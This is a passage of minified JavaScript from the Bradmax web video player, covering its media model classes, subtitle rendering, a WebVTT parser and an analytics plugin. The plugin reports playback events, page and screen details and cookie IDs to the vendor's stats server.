Jb};wa["bs.player.core.model.Playlist"]=Db,Db.__name__="bs.player.core.model.Playlist",Db.__super__=fa,Db.prototype=Ja(fa.prototype,{mediaList:null,__class__:Db});var Ab=function(){this.customParams=new Jb};wa["bs.player.core.model.SubtitlesSet"]=Ab,Ab.__name__="bs.player.core.model.SubtitlesSet",Ab.__super__=fa,Ab.prototype=Ja(fa.prototype,{languageCode:null,name:null,subtitleEntries:null,url:null,preselected:null,__class__:Ab});var db=function(){this.hideTime=this.showTime=0,this.customParams=new Jb,this.texts=[]};wa["bs.player.core.model.SubtitleEntry"]=db,db.__name__="bs.player.core.model.SubtitleEntry",db.prototype={showTime:null,hideTime:null,texts:null,customParams:null,__class__:db};var Za=function(){};wa["bs.player.core.model.SubtitleEntryText"]=Za,Za.__name__="bs.player.core.model.SubtitleEntryText",Za.prototype={styles:null,text:null,__class__:Za};var $a=function(){this.isDefault=!1,this.customParams=new Jb};wa["bs.player.core.model.AudioSet"]=$a,$a.__name__="bs.player.core.model.AudioSet",$a.__super__=fa,$a.prototype=Ja(fa.prototype,{languageCode:null,name:null,isDefault:null,preselected:null,__class__:$a});var ua=function(){this.customParams=new Jb};wa["bs.player.core.model.Image"]=ua,ua.__name__="bs.player.core.model.Image",ua.__super__=fa,ua.prototype=Ja(fa.prototype,{url:null,width:null,height:null,__class__:ua});var Ka=function(){this.customParams=new Jb};wa["bs.player.core.model.Genre"]=Ka,Ka.__name__="bs.player.core.model.Genre",Ka.__super__=fa,Ka.prototype=Ja(fa.prototype,{name:null,__class__:Ka});var Fa=function(){this.totalNumber=this.currentOrderNumber=1,this.durationPlayed=0,this.customParams=new Jb,this.showAdPositionInBreak=this.showTimeProgress=!0};wa["bs.player.core.model.AdMedia"]=Fa,Fa.__name__="bs.player.core.model.AdMedia",Fa.prototype={media:null,mediaClickTargetUrl:null,currentOrderNumber:null,totalNumber:null,durationPlayed:null,durationTotal:null,adId:null,customParams:null,showTimeProgress:null,showAdPositionInBreak:null,adStartTime:null,__class__:Fa};var tb=function(b,c,d,q){this.offset=b,this.duration=c,this.position=d,this.adsCount=q};wa["bs.player.core.model.AdInStreamBreakInfo"]=tb,tb.__name__="bs.player.core.model.AdInStreamBreakInfo",tb.prototype={offset:null,duration:null,position:null,adsCount:null,__class__:tb};var Eb=function(b,c){this.label=b,this.data=c};wa["bs.player.core.model.VideoQualityEventData"]=Eb,Eb.__name__="bs.player.core.model.VideoQualityEventData",Eb.prototype={label:null,data:null,bitrateKbps:null,width:null,height:null,__class__:Eb};var Sa=function(b,c,d,q){null==q&&(q="top"),null==d&&(d="left"),this.x=b,this.width=c,this.xPos=d,this.yPos=q};wa["bs.player.core.model.BrandImageLoadedEventData"]=Sa,Sa.__name__="bs.player.core.model.BrandImageLoadedEventData",Sa.prototype={x:null,width:null,yPos:null,xPos:null,__class__:Sa};var rb=function(){};wa["bs.player.core.model.DrmCustomLicenseServerHandler"]=rb,rb.__name__="bs.player.core.model.DrmCustomLicenseServerHandler",rb.__isInterface__=!0,rb.prototype={initContext:null,destroy:null,customWidevineLicenseRequestHandler:null,customPlayReadyLicenseRequestHandler:null,customFairplayCertificateRequestHandler:null,customFairplayLicenseRequestHandler:null,getLastError:null,clearCertCache:null,__class__:rb};var nb=function(){};wa["bs.player.core.model.MediaProgressSegment"]=nb,nb.__name__="bs.player.core.model.MediaProgressSegment",nb.prototype={duration:null,label:null,__class__:nb};var Bb=function(){};wa["bs.player.core.model.MediaProgressMarker"]=Bb,Bb.__name__="bs.player.core.model.MediaProgressMarker",Bb.prototype={time:null,label:null,__class__:Bb};var Ib=function(){};wa["bs.player.core.model.MediaProgressThumbnails"]=Ib,Ib.__name__="bs.player.core.model.MediaProgressThumbnails",Ib.prototype={url:null,imageBaseUrl:null,__class__:Ib};var Qb=function(){this.thumbnails=this.markersUrl=this.markers=this.segmentsUrl=this.segments=null};wa["bs.player.core.model.MediaProgress"]=Qb,Qb.__name__="bs.player.core.model.MediaProgress",Qb.prototype={segmentsUrl:null,segments:null,markersUrl:null,markers:null,thumbnails:null,__class__:Qb};var Vb=function(b,c){null==c&&(c=0),null==b&&(b=0),this.x=b,this.y=c};wa["bs.player.core.model.Point"]=Vb,Vb.__name__="bs.player.core.model.Point",Vb.prototype={x:null,y:null,__class__:Vb};var Zb=function(){va.call(this)};wa["bs.player.core.model.Episode"]=Zb,Zb.__name__="bs.player.core.model.Episode",Zb.__super__=va,Zb.prototype=Ja(va.prototype,{episodeNumber:null,season:null,__class__:Zb});var oc=function(){this.customParams=new Jb};wa["bs.player.core.model.EpisodeInfo"]=oc,oc.__name__="bs.player.core.model.EpisodeInfo",oc.__super__=fa,oc.prototype=Ja(fa.prototype,{episodeNumber:null,title:null,__class__:oc});var pc=function(){this.customParams=new Jb};wa["bs.player.core.model.Season"]=pc,pc.__name__="bs.player.core.model.Season",pc.__super__=fa,pc.prototype=Ja(fa.prototype,{title:null,descriptionShort:null,descriptionLong:null,images:null,seasonNumber:null,serie:null,episodes:null,__class__:pc});var Xa=function(){this.customParams=new Jb};wa["bs.player.core.model.Serie"]=Xa,Xa.__name__="bs.player.core.model.Serie",Xa.__super__=fa,Xa.prototype=Ja(fa.prototype,{title:null,descriptionShort:null,descriptionLong:null,images:null,seasons:null,__class__:Xa});var ob=function(){};wa["bs.player.core.model.SocialShareData"]=ob,ob.__name__="bs.player.core.model.SocialShareData",ob.prototype={url:null,title:null,__class__:ob};var lb=function(){this.pluginName="",this.pluginConfig=null,this.pluginName=fb.getClass(this).__name__.split(".").pop()};wa["bs.player.core.plugin.PluginBase"]=lb,lb.__name__="bs.player.core.plugin.PluginBase",lb.__interfaces__=[ia],lb.prototype={uid:null,context:null,className:null,pluginConfig:null,configuration:null,variables:null,eventHub:null,parentDisplay:null,display:null,player:null,pluginName:null,create:function(){},destroy:function(){},activate:function(){},postActivate:function(){},deactivate:function(){},eventFilter:function(b){return!0},registerPlugin:function(b){},getPluginVersion:function(){return"v2.14.380"},getPluginName:function(){return this.pluginName},get_configuration:function(){return this.configuration},set_configuration:function(b){return this.configuration=b},get_player:function(){return this.player},set_player:function(b){return this.player=b},get_variables:function(){return this.variables},set_variables:function(b){return this.variables=b},get_eventHub:function(){return this.eventHub},set_eventHub:function(b){return this.eventHub=b},get_parentDisplay:function(){return this.parentDisplay},set_parentDisplay:function(b){return this.parentDisplay=b},get_display:function(){return this.display},__class__:lb,__properties__:{set_player:"set_player",get_player:"get_player",get_display:"get_display",set_parentDisplay:"set_parentDisplay",get_parentDisplay:"get_parentDisplay",set_eventHub:"set_eventHub",get_eventHub:"get_eventHub",set_variables:"set_variables",get_variables:"get_variables",set_configuration:"set_configuration",get_configuration:"get_configuration"}};var Kb=function(){};wa["bs.player.core.plugin.VideoPlayerUtil"]=Kb,Kb.__name__="bs.player.core.plugin.VideoPlayerUtil",Kb.readPluginConfig=function(b){var c=w.configuration.plugins;b=fb.getClass(b).__name__;for(var d=0;d<c.length;){var q=c[d];if(++d,null!=q.config&&p.string(q.main)==b)return q.config}return{}};var Sb=function(){};wa["bs.player.core.renderer.ISubtitlesRenderer"]=Sb,Sb.__name__="bs.player.core.renderer.ISubtitlesRenderer",Sb.__isInterface__=!0,Sb.prototype={destroy:null,onResize:null,onCueEnter:null,onCueExit:null,__class__:Sb};var ac=function(b,c){this.context=b,this.playerContainer=c,this.isInitialized=!1,W.add(b,"selectSubtitles",U(this,this.onSelectSubtitles)),na.add(b,"resize",U(this,this.onResize))};wa["bs.player.core.renderer.SubtitlesRenderer"]=ac,ac.__name__="bs.player.core.renderer.SubtitlesRenderer",ac.__interfaces__=[Sb],ac.prototype={context:null,playerContainer:null,subtitlesParentContainer:null,subtitlesContainer:null,isInitialized:null,destroy:function(){W.remove(this.context,"selectSubtitles",U(this,this.onSelectSubtitles)),na.remove(this.context,"resize",U(this,this.onResize)),this.playerContainer=null},onSelectSubtitles:function(b){this.initSubtitlesPlaceholder()},onResize:function(b){null!=this.subtitlesParentContainer&&(b=this.subtitlesParentContainer.getBoundingClientRect().height,this.subtitlesContainer.style.fontSize=Math.floor(.05*b)+"px",this.subtitlesContainer.style.lineHeight=Math.floor(.08*b)+"px")},initSubtitlesPlaceholder:function(){if(!this.isInitialized){this.isInitialized=!0;var b=this.playerContainer.getElementsByClassName("htmlSubtitlesPlaceholder");if(0==b.length){this.subtitlesParentContainer=window.document.createElement("div"),this.subtitlesParentContainer.setAttribute("class","htmlSubtitlesPlaceholder"),this.subtitlesParentContainer.setAttribute("style","height: 100%;left: 0px;position: absolute;top: 0px;width: 100%;");for(var c=(b=this.playerContainer.childNodes).length-1,d=0,q=b.length;d<q;){var X=d++;"video"==b.item(X).nodeName.toLowerCase()&&(c=X)}c<b.length-1?this.playerContainer.insertBefore(this.subtitlesParentContainer,b[c+1]):this.playerContainer.appendChild(this.subtitlesParentContainer)}else this.subtitlesParentContainer=b.item(0),this.subtitlesParentContainer.innerHTML="";null==this.subtitlesContainer?(this.subtitlesContainer=window.document.createElement("div"),this.subtitlesContainer.style.position="absolute",this.subtitlesContainer.style.display="table",this.subtitlesContainer.style.textAlign="center",this.subtitlesContainer.style.overflow="initial",this.subtitlesContainer.style.pointerEvents="none",this.subtitlesContainer.style.bottom="5%",this.subtitlesContainer.style.left="10%",this.subtitlesContainer.style.width="80%",this.subtitlesContainer.style.height="auto",this.subtitlesContainer.style.justifyContent="center",this.subtitlesContainer.style.color="white",this.subtitlesContainer.style.backgroundColor="transparent",this.subtitlesContainer.style.fontFamily='"Helvetica Neue", Helvetica, Arial,sans-serif',this.subtitlesContainer.style.textShadow="0px 0px 7px #000000, 0px 0px 4px #000000, 0px 0px 10px #000000"):null!=this.subtitlesContainer.parentElement&&this.subtitlesContainer.parentElement.removeChild(this.subtitlesContainer),this.onResize(),this.subtitlesParentContainer.appendChild(this.subtitlesContainer)}},onCueEnter:function(b){this.initSubtitlesPlaceholder();for(var c=window.document.createElement("p"),d=[],q=0,X=b.texts;q<X.length;){var ra=X[q];++q,d.push(ra.text)}c.innerText=d.join("\n"),c.style.margin="0",c.style.display="table-row",null==this.subtitlesParentContainer.parentNode&&this.playerContainer.appendChild(this.subtitlesParentContainer),b.customParams.h._element=c,this.subtitlesContainer.appendChild(c)},onCueExit:function(b){this.subtitlesContainer.removeChild(b.customParams.h._element)},__class__:ac};var hc=function(){this.lineNumber=0,this.TIMESTAMP_SEPARATOR=" --\x3e ",this.WHITESPACE_REGEX=new u("[ \t\r\n]+","g"),this.END_LINE_REGEX=new u("(\r\n)|(\n)","g")};wa["bs.player.core.vtt.VttParser"]=hc,hc.__name__="bs.player.core.vtt.VttParser",hc.prototype={END_LINE_REGEX:null,WHITESPACE_REGEX:null,TIMESTAMP_SEPARATOR:null,lineNumber:null,lines:null,readLine:function(){var b=this.lines[this.lineNumber];return this.lineNumber++,null!=b&&0==this.lineNumber?f.replace(b,"\ufeff",""):b},isFileEnd:function(){return this.lineNumber>=this.lines.length},isEmptyStr:function(b){return null==b||""==b},skipEmptyLines:function(){for(var b=this.readLine();this.isEmptyStr(b)&&!this.isFileEnd();)b=this.readLine();this.isFileEnd()||this.lineNumber--},parseTimestamp:function(b){var c=(b=b.split("."))[0].split(":"),d=b[1],q=c.pop();return b=c.pop(),c=c.pop(),d=null==d?0:p.parseInt(d),q=null==q?0:p.parseInt(q),b=null==b?0:p.parseInt(b),(b=3600*(null==c?0:p.parseInt(c))+60*b)+q+d/1e3},parseHeader:function(b){if(-1==(b=f.trim(b)).indexOf("WEBVTT"))throw yb.thrown(new xc("Error in line: "+this.lineNumber+". WEBVTT text expected in first line."));return b},__class__:hc};var xc=function(b){this.message=b};wa["bs.player.core.vtt.VttParserError"]=xc,xc.__name__="bs.player.core.vtt.VttParserError",xc.prototype={message:null,__class__:xc};var kc=function(){lb.call(this),this.settingsTrackRealtimeStats=this.settingsTrackEngagementRate=this.settingsTrackAdsProgress=this.settingsTrackAds=!1,this.settingsEngagementRatePercResolution=1,this.pluginConfig={clientToken:"4zm4.zFqbOf1m4PzAqHmTfKbq4UwszEq4m9fEb"},this.mediaPlayback=new ab,this.adPlayback=new ab,this.logger=new cc,this.playerErrorLogLastSendAt=null,this.playerRemoteErrorLogEnabed=this.gdprAgreeForCookie=this.gdprAgreeRequired=!1};wa["bs.player.plugin.bradmax.analytics.BradmaxAnalytics"]=kc,kc.__name__="bs.player.plugin.bradmax.analytics.BradmaxAnalytics",kc.__super__=lb,kc.prototype=Ja(lb.prototype,{mediaPlayback:null,adPlayback:null,logger:null,clientToken:null,settingsTrackAds:null,settingsTrackAdsProgress:null,settingsTrackEngagementRate:null,settingsTrackRealtimeStats:null,settingsEngagementRatePercResolution:null,realtimeMediaId:null,realtimeMediaData:null,playerErrorLogLastSendAt:null,playerRemoteErrorLogEnabed:null,gdprAgreeRequired:null,gdprAgreeForCookie:null,activate:function(){if(this.loadSettings(),null!=this.clientToken&&""!=this.clientToken)if(W.add(this.context,"skinPlay",U(Oa=this.mediaPlayback,Oa.onPlayEvent)),W.add(this.context,"skinPause",U(Oa=this.mediaPlayback,Oa.onPauseEvent)),T.add(this.context,"currentTimeChange",U(Oa=this.mediaPlayback,Oa.onVideoProgress)),T.add(this.context,"durationChange",U(Oa=this.mediaPlayback,Oa.onVideoDurationChange)),T.add(this.context,"complete",U(Oa=this.mediaPlayback,Oa.onVideoComplete)),T.add(this.context,"playing",U(Oa=this.mediaPlayback,Oa.onVideoPlaying)),T.add(this.context,"paused",U(Oa=this.mediaPlayback,Oa.onVideoPaused)),T.add(this.context,"drmAuthenticationComplete",U(Oa=this.mediaPlayback,Oa.onDrmAuthenticationComplete)),T.add(this.context,"playing",U(this,this.onRealtimeEvent)),T.add(this.context,"paused",U(this,this.onRealtimeEvent)),T.add(this.context,"complete",U(this,this.onRealtimeEvent)),T.add(this.context,"mediaError",U(this,this.onRealtimeEvent)),aa.add(this.context,"mediaMetadataData",U(Oa=this.mediaPlayback,Oa.onMetadata)),aa.add(this.context,"mediaAfterPlaybackStartMetadata",U(Oa=this.mediaPlayback,Oa.onAfterPlaybackStartMetadataData)),Q.add(this.context,"adPlay",U(Oa=this.adPlayback,Oa.onPlayEvent)),Q.add(this.context,"adPause",U(Oa=this.adPlayback,Oa.onPauseEvent)),Q.add(this.context,"adCurrentTimeChange",U(Oa=this.adPlayback,Oa.onVideoProgress)),Q.add(this.context,"adDurationChange",U(Oa=this.adPlayback,Oa.onVideoDurationChange)),Q.add(this.context,"adComplete",U(Oa=this.adPlayback,Oa.onVideoComplete)),Q.add(this.context,"adPlaying",U(Oa=this.adPlayback,Oa.onVideoPlaying)),Q.add(this.context,"adPaused",U(Oa=this.adPlayback,Oa.onVideoPaused)),aa.add(this.context,"adMetadataData",U(Oa=this.adPlayback,Oa.onMetadata)),T.add(this.context,"mediaError",U(this,this.onVideoMediaError)),T.add(this.context,"mediaErrorFallbackTry",U(this,this.onVideoMediaErrorFallbackTry)),Q.add(this.context,"adMediaError",U(this,this.onAdVideoMediaError)),Q.add(this.context,"adMediaErrorFallbackTry",U(this,this.onAdVideoMediaErrorFallbackTry)),this.mediaPlayback.firstPlayingEventCallback=U(this,this.onMediaFirstPlayingEvent),this.settingsTrackAds&&(Q.add(this.context,"adAdClick",U(this,this.onAdClick)),this.adPlayback.firstPlayingEventCallback=U(this,this.onAdFirstPlayingEvent),this.settingsTrackAdsProgress&&(this.adPlayback.firstQuartilePlaybackCallback=U(this,this.onAdFirstQuartilePlayback),this.adPlayback.midpointPlaybackCallback=U(this,this.onAdMidpointPlayback),this.adPlayback.thirdQuartilePlaybackCallback=U(this,this.onAdThirdQuartilePlayback),this.adPlayback.completePlaybackCallback=U(this,this.onAdCompletePlayback))),this.settingsTrackEngagementRate&&(this.mediaPlayback.statsEngagementRateEnabled=!0,this.mediaPlayback.statsEngagementRatePercResolution=this.settingsEngagementRatePercResolution,this.mediaPlayback.engagementRatePercentProgressCallback=U(this,this.onEngegementRatePercProgress),this.mediaPlayback.engagementRateTimeProgressCallback=U(this,this.onEngegementRateTimeProgress)),!this.gdprAgreeRequired||this.gdprAgreeForCookie){var b=window._ba_enable_cookies;null!=b?b():console.error("Cannot enable BradmaxAnalytics users stats - missing _ba callback.")}else null!=(b=window._ba_disable_cookies)?b():console.error("Cannot disable BradmaxAnalytics users stats - missing _ba callback.")},loadSettings:function(){Object.prototype.hasOwnProperty.call(this.pluginConfig,"clientToken")&&(this.clientToken=m.field(this.pluginConfig,"clientToken")),Object.prototype.hasOwnProperty.call(this.pluginConfig,"baseUrl")&&(this.logger.baseUrl=m.field(this.pluginConfig,"baseUrl")),Object.prototype.hasOwnProperty.call(this.pluginConfig,"trackAds")&&(this.settingsTrackAds=m.field(this.pluginConfig,"trackAds")),Object.prototype.hasOwnProperty.call(this.pluginConfig,"trackAdsProgress")&&(this.settingsTrackAdsProgress=m.field(this.pluginConfig,"trackAdsProgress")),Object.prototype.hasOwnProperty.call(this.pluginConfig,"trackEngagementRate")&&(this.settingsTrackEngagementRate=m.field(this.pluginConfig,"trackEngagementRate")),Object.prototype.hasOwnProperty.call(this.pluginConfig,"trackRealtimeStats")&&(this.settingsTrackRealtimeStats=m.field(this.pluginConfig,"trackRealtimeStats")),Object.prototype.hasOwnProperty.call(this.pluginConfig,"gdprAgreeRequired")&&(this.gdprAgreeRequired=m.field(this.pluginConfig,"gdprAgreeRequired")),Object.prototype.hasOwnProperty.call(this.pluginConfig,"gdprAgreeForCookie")&&(this.gdprAgreeForCookie=m.field(this.pluginConfig,"gdprAgreeForCookie")),Object.prototype.hasOwnProperty.call(this.pluginConfig,"playerRemoteErrorLogEnabed")&&(this.playerRemoteErrorLogEnabed=m.field(this.pluginConfig,"playerRemoteErrorLogEnabed"));var b=this.get_variables();Object.prototype.hasOwnProperty.call(b,"bradmaxAnalytics")&&(b=m.field(this.get_variables(),"bradmaxAnalytics"),Object.prototype.hasOwnProperty.call(b,"clientToken")&&(this.clientToken=m.field(b,"clientToken")),Object.prototype.hasOwnProperty.call(b,"baseUrl")&&(this.logger.baseUrl=m.field(b,"baseUrl")),Object.prototype.hasOwnProperty.call(b,"trackAds")&&(this.settingsTrackAds=m.field(b,"trackAds")),Object.prototype.hasOwnProperty.call(b,"trackAdsProgress")&&(this.settingsTrackAdsProgress=m.field(b,"trackAdsProgress")),Object.prototype.hasOwnProperty.call(b,"trackEngagementRate")&&(this.settingsTrackEngagementRate=m.field(b,"trackEngagementRate")),Object.prototype.hasOwnProperty.call(b,"trackRealtimeStats")&&(this.settingsTrackRealtimeStats=m.field(b,"trackRealtimeStats")),Object.prototype.hasOwnProperty.call(b,"gdprAgreeRequired")&&(this.gdprAgreeRequired=m.field(b,"gdprAgreeRequired")),Object.prototype.hasOwnProperty.call(b,"gdprAgreeForCookie")&&(this.gdprAgreeForCookie=m.field(b,"gdprAgreeForCookie")),Object.prototype.hasOwnProperty.call(b,"playerRemoteErrorLogEnabed")&&(this.playerRemoteErrorLogEnabed=m.field(b,"playerRemoteErrorLogEnabed")))},onMediaFirstPlayingEvent:function(){var b={materialID:this.mediaPlayback.mediaId,title:this.mediaPlayback.title,event:"media.view",currentTime:this.mediaPlayback.currentTime,duration:this.mediaPlayback.duration,isDrmProtected:this.mediaPlayback.isDrmProtected};this.assignContentMetaToData(b),this.sendDataToLogger(b)},assignContentMetaToData:function(b){if(null!=this.mediaPlayback.media&&null!=this.mediaPlayback.media.contentMeta){var c=this.mediaPlayback.media.contentMeta;Object.prototype.hasOwnProperty.call(c.h,"tags")&&(b.tags=c.h.tags),Object.prototype.hasOwnProperty.call(c.h,"pageTags")&&(b.pageTags=c.h.pageTags);for(var d=0,q=kc.SPECIAL_CONTENT_META_TAGS;d<q.length;){var X=q[d];if(++d,Object.prototype.hasOwnProperty.call(c.h,X)){null==b.tags&&(b.tags=[]);var ra=""+p.string(c.h[X]);X=X+":"+(ra=encodeURIComponent(ra)),-1==b.tags.indexOf(X)&&b.tags.push(X)}}}},makeAdEvent:function(b){return{materialID:this.adPlayback.mediaId,relatedID:this.mediaPlayback.mediaId,title:this.adPlayback.title,event:b,currentTime:this.adPlayback.currentTime,duration:this.adPlayback.duration,isDrmProtected:this.adPlayback.isDrmProtected}},onAdFirstPlayingEvent:function(){this.sendDataToLogger(this.makeAdEvent("ad.view"))},onAdFirstQuartilePlayback:function(){this.sendDataToLogger(this.makeAdEvent("ad.view.25"))},onAdMidpointPlayback:function(){this.sendDataToLogger(this.makeAdEvent("ad.view.50"))},onAdThirdQuartilePlayback:function(){this.sendDataToLogger(this.makeAdEvent("ad.view.75"))},onAdCompletePlayback:function(){this.sendDataToLogger(this.makeAdEvent("ad.view.100"))},onAdClick:function(b){var c="";null!=b.data&&null!=b.data.url&&(c=b.data.url),this.sendDataToLogger({materialID:this.adPlayback.mediaId,relatedID:this.mediaPlayback.mediaId,title:this.adPlayback.title,event:"ad.click",currentTime:this.adPlayback.currentTime,duration:this.adPlayback.duration,isDrmProtected:this.adPlayback.isDrmProtected,relUrl:c})},onEngegementRatePercProgress:function(b){b={materialID:this.mediaPlayback.mediaId,title:this.mediaPlayback.title,event:"er.perc",currentTime:this.mediaPlayback.currentTime,duration:this.mediaPlayback.duration,isDrmProtected:this.mediaPlayback.isDrmProtected,engagementRatePosition:[b]},this.assignContentMetaToData(b),this.sendDataToLogger(b)},onEngegementRateTimeProgress:function(b){b={materialID:this.mediaPlayback.mediaId,title:this.mediaPlayback.title,event:"er.time",currentTime:this.mediaPlayback.currentTime,duration:this.mediaPlayback.duration,isDrmProtected:this.mediaPlayback.isDrmProtected,engagementRatePosition:[b]},this.assignContentMetaToData(b),this.sendDataToLogger(b)},sendDataToLogger:function(b){null==window._ba_action?console.error("Cannot send BradmaxAnalytics data. Data logger not found. Key window.bams not exists."):window._ba_action(this.clientToken,b)},onRealtimeEvent:function(b){if(this.settingsTrackRealtimeStats){var c=b.type;switch(b={materialID:this.mediaPlayback.mediaId,title:this.mediaPlayback.title,event:c,currentTime:b.data.currentTime,duration:this.mediaPlayback.duration},null!=this.realtimeMediaId&&this.realtimeMediaId!=this.mediaPlayback.mediaId&&this.realtimeEnd(this.realtimeMediaData),c){case"complete":case"mediaError":case"paused":this.realtimeEnd(b);break;case"playing":this.realtimeStart(b)}this.realtimeMediaId=this.mediaPlayback.mediaId,this.realtimeMediaData=b}},prepareErrorLodData:function(b,c){if((c={m:c,v:"v2.14.380",t:this.clientToken,ct:this.mediaPlayback.currentTime}).l=window.location.href,null!=b&&null!=b.data){null!=b.data.media&&null!=b.data.media.id&&(c["m.id"]=b.data.media.id),null!=b.data.media&&null!=b.data.media.source&&0<b.data.media.source.length&&null!=b.data.media.source[0]&&null!=b.data.media.source[0].url&&(c["m.s.url"]=b.data.media.source[0].url),null!=b.data.source&&""!=b.data.source&&(c["s.url"]=b.data.source);try{null!=b.data.additionalData&&(JSON.stringify(b.data.additionalData),c.d=b.data.additionalData)}catch(d){}}return c},sendPlayerErrorLog:function(b,c){if(this.playerRemoteErrorLogEnabed&&!(null!=this.playerErrorLogLastSendAt&&3e3>(new Date).getTime()-this.playerErrorLogLastSendAt.getTime()))try{var d=this.prepareErrorLodData(b,c),q=JSON.stringify(d);(new Image).src="https://bradmax.com/static/player-error-log/img.gif?d="+encodeURIComponent(q),this.playerErrorLogLastSendAt=new Date}catch(X){}},onVideoMediaError:function(b){this.sendPlayerErrorLog(b,"error")},onAdVideoMediaError:function(b){this.sendPlayerErrorLog(b,"error_ad")},onVideoMediaErrorFallbackTry:function(b){this.sendPlayerErrorLog(b,"error_fallback")},onAdVideoMediaErrorFallbackTry:function(b){this.sendPlayerErrorLog(b,"error_ad_fallback")},realtimeStart:function(b){b.event="media.user.start",this.assignContentMetaToData(b),this.sendDataToLogger(b)},realtimeEnd:function(b){b.event="media.user.end",this.assignContentMetaToData(b),this.sendDataToLogger(b)},__class__:kc});var cc=function(){this.s=window.screen,this.w=window,this.d=document,(window.bradmax_analytics={}).action=U(this,this.action),0==this.w.location.href.indexOf("http://")?this.baseUrl="http://":this.baseUrl="https://",this.baseUrl+="stats.bradmax.com/v1"};wa["bs.player.plugin.bradmax.analytics.BradmaxAnalyticsLogger"]=cc,cc.__name__="bs.player.plugin.bradmax.analytics.BradmaxAnalyticsLogger",cc.prototype={d:null,w:null,s:null,baseUrl:null,action:function(b,c){if(null==b&&(b=""),""==b||null==c||""==c.event)console.warn("WRONG REQUEST");else{var d=[],q=function(Qa){Qa+="=";for(var Wa=decodeURIComponent(document.cookie).split(";"),Cb=0;Cb<Wa.length;Cb++){for(var Ub=Wa[Cb];" "==Ub.charAt(0);)Ub=Ub.substring(1);if(0==Ub.indexOf(Qa))return Ub.substring(Qa.length,Ub.length)}return""},X=q("_baml");""==X&&(X=this.uuid());var ra=qd.get("_bame");null==ra&&(ra=this.uuid()),(q=function(Qa,Wa,Cb){var Ub=new Date;Ub.setTime(Ub.getTime()+864e5*Cb),Cb="expires="+Ub.toUTCString(),document.cookie=Qa+"="+Wa+";"+Cb+";path=/"})("_baml",X,730),(q=function(Qa,Wa,Cb){var Ub=new Date;Ub.setTime(Ub.getTime()+864e5*Cb),Cb="expires="+Ub.toUTCString(),document.cookie=Qa+"="+Wa+";"+Cb+";path=/"})("_bame",ra,.020833333333333332),d.push(["lc",X]),d.push(["sc",ra]),d.push(["pt",""+this.d.title]),d.push(["lo",""+this.d.location.href]),d.push(["la",""+p.string(navigator.language)]),d.push(["cs",""+p.string(document.characterSet)]),d.push(["re",this.s.availWidth+"x"+this.s.availHeight]),d.push(["vp",Math.max(this.d.documentElement.clientWidth,0|this.w.innerWidth)+"x"+Math.max(this.d.documentElement.clientHeight,0|this.w.innerHeight)]),q=null;try{q=function(Qa){for(var Wa=1;!Qa(Wa)&&16777216>=Wa;)Wa*=2;if(16777216<Wa)return 0;for(var Cb=Wa/2;1<Wa-Cb;){var Ub=Wa+Cb>>1;Qa(Ub)?Wa=Ub:Cb=Ub}return Wa}((function(Qa){return matchMedia("(max-resolution: "+Qa+"dpi)").matches}))}catch(Qa){}d.push(["dp",""+(0==q?null:q)]),q=""+p.string(screen.orientation||screen.mozOrientation||screen.msOrientation),d.push(["so",-1!=q.indexOf("landscape")?"l":"p"]),d.push(["ev",""+c.event]),d.push(["mi",""+c.materialID]),d.push(["ri",""+c.relatedID]),d.push(["ct",""+c.currentTime]),d.push(["du",""+c.duration]),d.push(["vt",""+c.title]),d.push(["vo",""+c.volume]),d.push(["ms",""+c.currentState]),d.push(["pr",""+c.progress]);try{var Aa=c.videoResolution.width+"x"+c.videoResolution.height}catch(Qa){Aa=""}d.push(["vr",""+Aa]),d.push(["br",""+c.bitrate]),d.push(["ss",""+c.selectedSubtitle]),d.push(["sa",""+c.selectedAudio]);try{Aa=c.tags.join(",")}catch(Qa){Aa=""}for(d.push(["tg",""+Aa]),d.push(["mt",""+c.mimeType]),d.push(["dr",c.isDrmProtected?"1":"0"]),d.push(["ru",""+c.relUrl]),d.push(["pv",""+c.playerVersion]),d.push(["ei",""+c.externalId]),c=[],Aa=0;Aa<d.length;)q=d[Aa],++Aa,""!=q[1]&&"undefined"!=q[1]&&"null"!=q[1]&&c.push(q[0]+"="+encodeURIComponent(q[1]));c.push("r="+Math.floor(1e9*Math.random())),d=c.join("&"),(new Image).src=this.baseUrl+"/"+b+"/?"+d}},getCookie:function(b){a:{b+="=";for(var c=decodeURIComponent(document.cookie).split(";"),d=0;d<c.length;d++){for(var q=c[d];" "==q.charAt(0);)q=q.substring(1);if(0==q.indexOf(b)){b=q.substring(b.length,q.length);break a}}b=""}return b},setCookie:function(b,c,d){var q=new Date;q.setTime(q.getTime()+864e5*d),d="expires="+q.toUTCString(),document.cookie=b+"="+c+";"+d+";path=/"},getResolution:function(){return this.s.availWidth+"x"+this.s.availHeight},getViewport:function(){return Math.max(this.d.documentElement.clientWidth,0|this.w.innerWidth)+"x"+Math.max(this.d.documentElement.clientHeight,0|this.w.innerHeight)},getTitle:function(){return this.d.title},getLocation:function(){return this.d.location.href},getLanguage:function(){return navigator.language},getCharacterset:function(){return document.characterSet},warn:function(b){console.warn(b)},getDpi:function(){var b=null;try{b=function(c){for(var d=1;!c(d)&&16777216>=d;)d*=2;if(16777216<d)return 0;for(var q=d/2;1<d-q;){var X=d+q>>1;c(X)?d=X:q=X}return d}((function(c){return matchMedia("(max-resolution: "+c+"dpi)").matches}))}catch(c){}return 0==b?null:b},getScreenOrientation:function(){return-1!=(""+p.string(screen.orientation||screen.mozOrientation||screen.msOrientation)).indexOf("landscape")?"l":"p"},getVideoResolution:function(b){try{return b.videoResolution.width+"x"+b.videoResolution.height}catch(c){return""}},getTags:function(b){try{return b.tags.join(",")}catch(c){return""}},uuid:function(b){null==b&&(b="xxxxxxxxxx"),b=b.toLowerCase();for(var c="";c.length<b.length;)if("-"===b.charAt(0))c+="-";else c+="1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM".charAt(p.random(62));return c},__class__:cc};var 